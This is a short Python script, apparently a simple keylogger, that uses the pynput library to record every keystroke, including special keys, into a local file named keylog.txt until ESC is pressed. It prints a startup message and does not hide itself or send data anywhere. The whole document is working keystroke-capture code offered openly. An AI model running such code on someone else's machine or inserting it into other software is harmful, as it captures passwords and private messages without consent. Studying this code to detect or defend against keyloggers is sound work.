import pynput.keyboard
import os

log_file = "keylog.txt"


def on_press(key):
    try:
        
        with open(log_file, "a") as f:
            f.write(key.char)
    except AttributeError:
        
        with open(log_file, "a") as f:
            f.write("[" + str(key) + "]")

    
    if key == pynput.keyboard.Key.esc:
        return False


def main():
    
    if not os.path.isfile(log_file):
        open(log_file, "w").close()

    
    with pynput.keyboard.Listener(on_press=on_press) as listener:
        print("🔑 Keylogger started... Logging keystrokes to:", log_file)
        print("⚠️ Press ESC to stop.")
        listener.join()

if __name__ == "__main__":
    main()
